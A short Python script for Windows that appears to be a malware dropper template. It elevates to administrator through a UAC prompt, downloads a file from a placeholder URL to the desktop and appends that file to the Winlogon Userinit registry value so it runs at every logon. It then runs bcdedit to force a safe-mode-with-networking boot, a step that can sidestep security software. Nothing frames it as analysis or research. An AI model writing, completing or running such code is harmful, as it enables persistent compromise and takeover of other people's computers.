import os
import sys
import ctypes
import urllib.request
import subprocess
import winreg

# Placeholder URL and file path
DOWNLOAD_URL = ''  # TODO: Replace with actual URL
SAVE_PATH = '%USERPROFILE%\desktop\lmao.py'  # TODO: Replace with desired path

# Placeholder admin command
ADMIN_COMMAND = ['bcdedit', '/set', '{CURRENT}', 'safeboot', 'network']  # Default admin command

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_file(url, save_path):
    print(f"Downloading {url} to {save_path}...")
    urllib.request.urlretrieve(url, save_path)
    print("Download complete.")

def run_admin_command(command, extra_args=None):
    # Run the command hidden as admin
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    full_command = command.copy()
    if extra_args:
        full_command.extend(extra_args)
    try:
        subprocess.run(full_command, startupinfo=si, check=True, shell=True)
    except Exception as e:
        print(f"Failed to run admin command: {e}")

def elevate():
    # Relaunch the script with admin rights
    params = ' '.join([f'"{arg}"' for arg in sys.argv])
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
    sys.exit()

def add_to_userinit(file_path):
    try:
        reg_path = r"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"
        with winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE) as reg:
            with winreg.OpenKey(reg, reg_path, 0, winreg.KEY_READ | winreg.KEY_WRITE) as key:
                userinit, regtype = winreg.QueryValueEx(key, "Userinit")
                userinit_list = [p.strip() for p in userinit.split(',') if p.strip()]
                if file_path not in userinit_list:
                    userinit_list.append(file_path)
                    new_userinit = ','.join(userinit_list)
                    winreg.SetValueEx(key, "Userinit", 0, regtype, new_userinit)
                    print(f"Added {file_path} to Userinit.")
                else:
                    print(f"{file_path} is already in Userinit.")
    except Exception as e:
        print(f"Failed to modify Userinit: {e}")

def main():
    if not is_admin():
        print("Admin privileges required. Attempting to elevate...")
        elevate()
    else:
        download_file(DOWNLOAD_URL, SAVE_PATH)
        add_to_userinit(SAVE_PATH)
        # Pass any extra arguments from the command line to the admin command
        extra_args = sys.argv[1:]
        run_admin_command(ADMIN_COMMAND, extra_args)

if __name__ == "__main__":
    main()
